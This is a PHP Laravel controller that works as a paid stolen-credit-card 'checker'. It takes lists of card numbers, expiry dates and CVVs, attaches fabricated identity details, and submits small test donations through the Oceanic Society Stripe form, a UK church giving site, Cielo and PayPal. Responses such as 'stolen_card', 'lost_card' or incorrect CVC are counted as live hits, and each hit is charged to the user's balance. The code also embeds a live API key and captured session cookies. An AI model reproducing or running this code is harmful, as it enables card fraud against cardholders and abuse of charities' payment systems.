<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class CartaoController extends Controller{

    public function cartao(Request $request){
        
        $lista = $request->input('lista');
        $lista = trim($lista);

        $cc  = explode('|', $lista)[0];
        $mes = explode('|', $lista)[1];
        $ano = explode('|', $lista)[2];
        $cvv = explode('|', $lista)[3];
        $bin = substr($cc, 0,6);

        $dados = Controller::getHumano();

        $nome = explode(' ', $dados['nome']);

        $infocard = Controller::getBin($bin);

        $debito = ["R$ 1,40", "R$ 4,23", "R$ 5,19", "R$ 4,21", "R$ 3,24", "R$ 3,10", "R$ 1,10"];

        

        if($infocard['bandeira'] == "DISCOVER"){

            error_reporting(0);
            set_time_limit(0);
            error_reporting(0);

            date_default_timezone_set('America/Buenos_Aires');

            if(file_exists(getcwd().('/cookie.txt'))){
                @unlink(getcwd().('/cookie.txt'));
            }

            error_log("Entrou aqui...");

            $ano = substr($ano, 2, 3);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.stripe.com',
            'accept: application/json',
            'origin: https://js.stripe.com',
            'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-N910U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Mobile Safari/537.36',
            'content-type: application/x-www-form-urlencoded',
            'sec-fetch-site: same-site',
            'sec-fetch-mode: cors',
            'sec-fetch-dest: empty',
            'referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.oceanicsociety.org&stripe_xdm_c=default575609&stripe_xdm_p=1'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'key=pk_live_v90ROmTZ2Q17v60z8TrBVTHZ&payment_user_agent=stripe.js%2Fa44017d&card[type]=visa&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[expiry]='.$mes.'%2F'.$ano.'&card[name]='.$dados['nome'].'&card[address_line1]='.$dados['endereco'].'&card[address_city]='.$dados['cidade'].'&card[address_state]='.$dados['estado'].'&card[address_zip]='.$dados['cep'].'&card[address_country]=BR&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
            $result1 = curl_exec($ch);
            curl_close($ch);

            error_log($result1);

            $token = trim(strip_tags(getStr($result1,'"id": "','"')));
            $token3 = trim(strip_tags(getStr($result1,'"client_ip": "','"')));
            $token2 = trim(strip_tags(getStr($result1,'"cvc_check": "','"')));

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://www.oceanicsociety.org/payments/api/process');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: www.oceanicsociety.org',
            'accept: application/json, text/javascript, */*; q=0.01',
            'origin: https://www.oceanicsociety.org',
            'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-N910U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Mobile Safari/537.36',
            'content-type: application/x-www-form-urlencoded',
            'sec-fetch-site: same-site',
            'sec-fetch-mode: cors',
            'sec-fetch-dest: empty',
            'referer: https://www.oceanicsociety.org/widgets/v2'
            ));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'donation%5Bamount%5D=1&donation%5Brecurring%5D=&donation%5Bmemo%5D=&donation%5Btags%5D=&donation%5Bdesignation%5D=projects%2F398&accept_terms=true&member%5Btype%5D=individual&member%5Banon%5D=false&member%5Bfirst_name%5D='.explode(' ', $dados['nome'])[0].'&member%5Blast_name%5D='.explode(' ', $dados['nome'])[1].'&member%5Bemail%5D='.$dados['email'].'&member%5Baddress%5D%5Bcity%5D='.$dados['cidade'].'&member%5Baddress%5D%5Bstate%5D='.$dados['estado'].'&member%5Baddress%5D%5Baddress%5D='.$dados['endereco'].'&member%5Baddress%5D%5BzipCode%5D='.$dados['cep'].'&member%5Baddress%5D%5Bcountry%5D=BR&member%5Bphone%5D='.$dados['celular'].'&transaction%5Bgateway%5D=stripe&transaction%5Btoken%5D='.$token.'');
            $result = curl_exec($ch);

            error_log($result);

            if (strpos($result, '"cvc_check": "pass"')) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, "Thank You For Donation." )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, "Thank You." )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, 'security code is incorrect.' )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, 'security code is invalid.' )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif (strpos($result, "incorrect_cvc")) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, 'incorrect_zip' )) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif (strpos($result, "stolen_card")) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif (strpos($result, "lost_card")) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }
              elseif(strpos($result, 'Your card has insufficient funds.')) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }elseif(strpos($result, 'Your card has expired.')) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
              }else{
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | ".$dados['nome']." | Reprovada"
                ], 400);
              }

        }else{

            $ch = curl_init();
            curl_setopt_array($ch, array(
            CURLOPT_URL => 'https://jesushouse.myiknowchurch.co.uk/giving/createDonation',
            CURLOPT_HEADER => array(
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding: gzip, deflate, br',
                'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cache-Control: no-cache',
                'Connection: keep-alive',
                'Content-Length: 157',
                'Content-Type: application/x-www-form-urlencoded',
                'Cookie: __cfduid=dfac5f84b907a049ac796f22067609d651594065728; __utmz=117088413.1594065744.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=117088413.1156610641.1594065744.1594065744.1595604271.2; __utmc=117088413; ci_sessions=pev8h1b6ven3kmimin6v1nj1o59kp0vl',
                'Host: jesushouse.myiknowchurch.co.uk',
                'Origin: https://jesushouse.myiknowchurch.co.uk',
                'Pragma: no-cache',
                'Referer: https://jesushouse.myiknowchurch.co.uk/giving',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'X-Requested-With: XMLHttpRequest',
            ),
            CURLOPT_USERAGENT=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
            CURLOPT_RETURNTRANSFER =>1,
            CURLOPT_FOLLOWLOCATION =>0,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_POSTFIELDS =>'notes=&giftaid=0&card_fname='.$nome[0].'&card_sname='.$nome[1].'&card_line1='.$dados['endereco'].'&card_postcode='.$dados['cep'].'&email='.$dados['email'].'&giving_id=&amount=10.00&campaign_id=0'));
            $conta = curl_exec($ch);
        
            $invoice = Controller::dados(trim($conta), 'invoice":"', '"');
            
            $mg = curl_init();
            curl_setopt_array($mg, array(
            CURLOPT_URL => 'https://jesushouse.myiknowchurch.co.uk/giving/pay',
            CURLOPT_HEADER => array(
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding: gzip, deflate, br',
                'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cache-Control: no-cache',
                'Connection: keep-alive',
                'Content-Length: 309',
                'Content-Type: application/x-www-form-urlencoded',
                'Cookie: __cfduid=dfac5f84b907a049ac796f22067609d651594065728; __utmz=117088413.1594065744.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=117088413.1156610641.1594065744.1594065744.1595604271.2; __utmc=117088413; ci_sessions=pev8h1b6ven3kmimin6v1nj1o59kp0vl',
                'Host: jesushouse.myiknowchurch.co.uk',
                'Origin: https://jesushouse.myiknowchurch.co.uk',
                'Pragma: no-cache',
                'Referer: https://jesushouse.myiknowchurch.co.uk/giving',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
                'X-Requested-With: XMLHttpRequest',
            ),
            CURLOPT_RETURNTRANSFER =>1,
            CURLOPT_FOLLOWLOCATION =>0,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_POSTFIELDS =>'card_fname='.$nome[0].'&card_sname='.$nome[1].'&card_number='.$cc.'&card_start_m=&card_start_y=&card_expiry_m='.$mes.'&card_expiry_y='.$ano.'&card_cvv='.$cvv.'&card_line1='.$dados['endereco'].','.$dados['numero'].'&card_line2=&card_line3=&card_city='.$dados['cidade'].'&card_county='.$dados['estado'].'&card_postcode='.$dados['cep'].'&system_id=1&desc=iKnow+Web+Giving&amount=10.00&invoice='.$invoice.''));
            $dados_checker = curl_exec($mg);

            curl_close($mg);

            error_log($invoice);
            error_log(Controller::dados(trim($dados_checker), 'url":"', '"'));

            if (strpos($dados_checker, "https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/auth.bb") !== false) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
            }else if (strpos($dados_checker, "auth.bb") !== false) {
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
            }else if(strpos($dados_checker, "https:\/\/3dsecure.santander.com.br\/AuthenticationWEB\/in.jsp") !== false){
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);

            }else if(strpos($dados_checker, "https:\/\/authenticationweb.cartoes-itau.com.br\/AuthenticationWEB\/in.jsp") !== false){
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
            
            }else if(strpos($dados_checker, "https:\/\/authentication.cardinalcommerce.com\/ThreeDSecure\/V1_0_2\/PayerAuthentication") !== false){
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
            
            }else if(strpos($dados_checker, "https:\/\/mastercardsecurecode.secureacs.com\/AcsPreAuthenticationWEB\/PreAuthenticationServlet") !== false){
                Controller::debitaSaldo(session('id'));
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | Nome: ".$dados['nome']." | Debitou: ".$debito[array_rand($debito, 1)]."<br>"
                ], 200);
            
            }else{
                return response()->json([
                    "message"=>"$cc | $mes | $ano | $cvv | ".$dados['nome']." | Reprovada"
                ], 400);
            }

        }
        
    }

    public function cartao2(Request $request){

        $lista = $request->input('lista');
        $lista = trim($lista);

        $cc  = explode('|', $lista)[0];
        $mes = explode('|', $lista)[1];
        $ano = explode('|', $lista)[2];
        $cvv = explode('|', $lista)[3];
        $bin = substr($cc, 0,6);

        $dados = Controller::getHumano();

        $nome = explode(' ', $dados['nome']);

        $infocard = Controller::getBin($bin);

        $debito = ["R$ 1,40", "R$ 4,23", "R$ 5,19", "R$ 4,21", "R$ 3,24", "R$ 3,10", "R$ 1,10"];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: api.stripe.com',
        'accept: application/json',
        'origin: https://js.stripe.com',
        'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-N910U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.14 Mobile Safari/537.36',
        'content-type: application/x-www-form-urlencoded',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fwww.oceanicsociety.org&stripe_xdm_c=default575609&stripe_xdm_p=1'
        ));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'key=pk_live_v90ROmTZ2Q17v60z8TrBVTHZ&payment_user_agent=stripe.js%2Fa44017d&card[type]=visa&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[expiry]='.$mes.'%2F'.$ano.'&card[name]='.$dados['nome'].'&card[address_line1]='.$dados['endereco'].'&card[address_city]='.$dados['cidade'].'&card[address_state]='.$dados['estado'].'&card[address_zip]='.$dados['cep'].'&card[address_country]=BR&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
        $resultado = curl_exec($ch);

        error_log($resultado);
        
    }

    public function cartao3(Request $request){

        $lista = $request->input('lista');
        $lista = trim($lista);

        $cc  = explode('|', $lista)[0];
        $mes = explode('|', $lista)[1];
        $ano = explode('|', $lista)[2];
        $cvv = explode('|', $lista)[3];
        $bin = substr($cc, 0,6);

        $dados = Controller::getHumano();

        $nome = explode(' ', $dados['nome']);

        $infocard = Controller::getBin($bin);

        $debito = ["R$ 1,40", "R$ 4,23", "R$ 5,19", "R$ 4,21", "R$ 3,24", "R$ 3,10", "R$ 1,10"];

        $cabeçalhos = [
            "Content-Type: application/json",
            'MerchantId: 9cd7b540-13d9-4332-962d-9213eb8e1b7e',
            'MerchantKey: 0123456789012345678901234567890123456789'  
        ];
        
        $corpo = [
            "MerchantOrderId" => "2014111903",
            "Customer" => [
                "Name" => $dados['nome']
            ],
            "Payment" => [
                "Type" => "CreditCard",
                "Amount" => 500,
                "Installments" => 1,
                "Authenticate" => true,
                "ReturnUrl" => "http://missaoadore.com.br/oferta-/",
                "SoftDescriptor" => "Tudo de bom",
                "CreditCard" => [
                    "CardNumber" => $cc,
                    "Holder" => $dados['nome'],
                    "ExpirationDate" => $mes."/".$ano,
                    "SecurityCode" => $cvv,
                    "Brand" => "master"
                ]
            ]
        ];  

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.cieloecommerce.cielo.com.br/1/sales');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cabeçalhos);
        curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($corpo));

        $resultado = curl_exec($ch);

        error_log($resultado);
        
    }

    public function cartao4(Request $request){

        $lista = $request->input('lista');
        $lista = trim($lista);

        $cc  = explode('|', $lista)[0];
        $mes = explode('|', $lista)[1];
        $ano = explode('|', $lista)[2];
        $cvv = explode('|', $lista)[3];
        $bin = substr($cc, 0,6);

        $dados = Controller::getHumano();

        $nome = explode(' ', $dados['nome']);

        $infocard = Controller::getBin($bin);

        $debito = ["R$ 1,40", "R$ 4,23", "R$ 5,19", "R$ 4,21", "R$ 3,24", "R$ 3,10", "R$ 1,10"];

        $corpo = [
            "payment_method"=>"paypal",
            "credit_card[number]"=>$cc,
            "credit_card[type]"=>"MCARD",
            "credit_card[expire_month]"=>$mes,
            "credit_card[expire_year]"=>$ano,
            "credit_card[cvv2]"=>$cvv,
            "rememberCard"=>false,
            "isFixedInstallment"=>false,
            "allowMarketing"=>false,
            "payerId"=>"",
            "termInfo"=>"5G2Zrx0FIxI6giBYTx8d2EKt0877EcVdNrnnurkPnsF9DvWkfK5kvas7ZPzJnWnzFMfTTEdnyaBknDK/uz2RxPYAehUz1+/y5jMlQwIIff16AFEgcHOg7jm4ViH3b9bKI4zurwUP7wZgrGCUwrp985vqpUry4Mlz/aW3Wp6vAkrDy5DzHLLTn27FLbDqcGg/id/DdlY9ZLDoQSj0NIFZwluboHND2YMV8B6d/ceCJgZ1OiXnSoCcYvxXNyma5KwTHk5acj55ONLp7wRFkqv4v612wE5/5Xv8W9n8Qaqd4gWVjjuntpLdiPOY2JeRYLg5b5i0UngkguRY94sKn3JWBYpGEREs/VpcCOcjJTNfymscuk6qKE2hGVtEJWNwefj0kiXVo/axAv5vcz1gqAgD5pUWaAPXTfpu7UDAXNBRF0M6A0dYk6NaJwYi/4InpxheSVflsr+qEpKrb2VVp/ck0ilOkeOvvnCy",
            "encryptedOM"=>"8d79IOvwrwLlw50Ne5EUZOQaC+Z3Lvnnm30bC1SRQZ8Kk/ARb7KKXLw6LwT0fLxPD35Y11KqkBBjCR4aoqA4VQ8RIYtLpBrreZxYpu8B+xAXg2H1Ls71BsciX83ocajgw2n68TKVf+1tux9kcDnW/eU6yGEmfR72iQwsm8NggAvZEuiSSRwCNDfvwwqXEwLaamGFiTPI3J6jPlDbYk+UyYzLapgN+LA1irJNaHoqwg6iyyqPvtqC7n++s2qVs2XFYPDiVeDcfyao7x3hHE6I/4QQ5A5Y4QOAojy7gH6MEV3bfIeIuFowLEocpxO4OJhszmRv1sPdGj5C4Cn/beJnkFZTLVRdj91vhaB4h+DEvRbSfw/1SBdLAvgFRyLug9V0BQpsPqYnQHHbA8HPk5vAuIItvbMEHvcq+FEoAawddGqegsgJzorcWEjVgfXfG3y+wMOIuB7zsKGAhSt+tdQNrPu4v1DcH2je5xy8Fiq8QKZavmUY5BeClGqPmt2ilB+6FsChdPcCtIufQRE0nKR5iI1KWx3iVvVGG9l94GodvAiLXy8sL7SFy6LjL9dk1BtGCRN0zslXrwDukzJrunkbVNpMuPwqwD4IMKaaHVB6qlHUGAkVDkgfPiSfBFfhvL+0nm7958MtbHGIGc8/1IRstfp9BRfyaVOAA56yxqy7n/otdoTYQqASljGHdvc97DUUcjt0oQ75sLRBa1wTIcN514bdOdJ/LVaRkrj2HYhkK7fd5bJta8HJOH+KbYRFFtqinRqfUDQ+UekFQ/JfRVCsEXy7+raseTMzHm53qC4R9wFZxyyY01wvsN8ovTzbeOoQjF7K4qrG3/7DGLLuY60cYcuOKEFozkEqtzU54XM57msZRlZk+KB00halkWboH2u0hIIGwyjT4DeSb4aVrywIMHJJooVcfH27esoK3N9BHPlDgkkdsNlpf5vNKttXta5WzJOeqWhtAZ+YT7pgLrHKGCTSFMfifkF9/Lu798QF3OUnbLKomd/TA6/nlbojul0lDkQGkU3jgB52ZDL4ENXNn/A7IzmpnLzYQL7elKno+BH6LPz+gl/OGZaAn8BgI6ygDVeBFzNk63iN1X8C35lFCNn4myBCu5Ju6MuYeleBNMZvIqs/twlnAcoLReny+NF+semL3eKSDujGoJP2uQBd6PpLSBgcUKtqpQ9V/ZexQGfk4sv8h4gaopVBqO0hR33CATUKB17yX5I=",
            "payerName[firstName]"=>$nome[0],
            "payerName[lastName]"=>$nome[1]            
        ];

        $cabeçalhos = [
            'accept: */*',
            'accept-encoding: gzip, deflate, br',
            'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control: no-cache',
            'content-length: '.strlen(json_decode($corpo)).'',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'cookie: cookie_prefs=P%3D1%2CF%3D1%2Ctype%3Dimplicit; KHcl0EuY7AKSMgfvHl7J5E7hPtK=vJyTLAMFJHW2cUmOciCWxRx_ukWke-AkxpNG4si-cJGQ-8p4qXzisRNVarDswmetP_IKpRA93XzAqpMq; enforce_policy=; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IkltYkFRb3RPRWNWdzNNYW5fVEdZUzBrWkVNNXQxT1FBZW96NkJVVTVvVmxXOGFUWVpGX1BGYk11SVU0OXlNUVVJel9xakVVcGEzRmRPT3dwTVZQTFFfNVJtSDVkWTZMUWhVVV9IS0I4OGc4Slh4V2hEQkgxMnR5MnBPZEs1TlRTbk4tN3p1dzBYS3Fsd0ZteHlkQVV5RXJpVk9wR0ZDaWlsRU1jMGs1S3lmSDNIY1laOG16SUV6ZEtlTzgiLCJpYXQiOjE1OTU3Mjc4NDYsImV4cCI6MTU5NTczMTQ0Nn0.lZl3K3tDLxqbWfDO7AegiyB6DsKD8SZGrMwCH-nMr8I; LANG=pt_BR%3BBR; nsid=s%3AFoccLde-ht8Kd6rZuG3U4lfNc5yGITAa.Snro61lQDKGqhLqMYRGS1quh9ExRcnaQmntnkjrZLdw; ts_c=vr%3D2466e15c1730a4cc0f55faedffffffff%26vt%3D90e180cb1730a4cc1f94fb44ff31879e; X-PP-L7=1; x-cdn=fastly:GRU; tsrce=ppplusbrcpmnodeweb; x-pp-s=eyJ0IjoiMTU5NTg2MzkyOTk3MiIsImwiOiIxIiwibSI6IjAifQ; X-PP-SILOVER=name%3DLIVE6.WEB.1%26silo_version%3D880%26app%3Dppplusbrcpmnodeweb%26TIME%3D1595863929%26HTTP_X_PP_AZ_LOCATOR%3Ddcg14.slc; ts=vreXpYrS%3D1690471929%26vteXpYrS%3D1595865729%26vr%3D2466e15c1730a4cc0f55faedffffffff%26vt%3D90e180cb1730a4cc1f94fb44ff31879e%26vtyp%3Dreturn',
            'origin: https://www.paypal.com',
            'pragma: no-cache',
            'referer: https://www.paypal.com/inlinepaymentwall/payment-selection',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
            'x-requested-with: XMLHttpRequest'
        ];


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/inlinepaymentwall/payment-inline');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cabeçalhos);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($corpo));

        $resultado = curl_exec($ch);

        error_log($resultado);
        
    }

}

